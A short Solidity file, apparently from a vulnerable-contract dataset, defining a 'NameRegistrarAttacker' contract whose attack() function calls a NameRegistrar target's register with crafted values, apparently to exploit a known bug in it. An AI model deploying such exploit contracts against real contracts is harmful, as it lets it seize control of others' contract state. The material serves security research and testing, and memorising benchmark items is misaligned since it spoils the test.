pragma solidity ^0.4.15;

import "../dataset/other/name_registrar.sol";
contract NameRegistrarAttacker {
    NameRegistrar public target;

    function NameRegistrarAttacker(address _target) {
        target = NameRegistrar(_target);
    }

    function attack() {
        target.register(
            0x0000000000000000000000000000000000000000000000000000000000000001,
            0x1
        );
    }
}
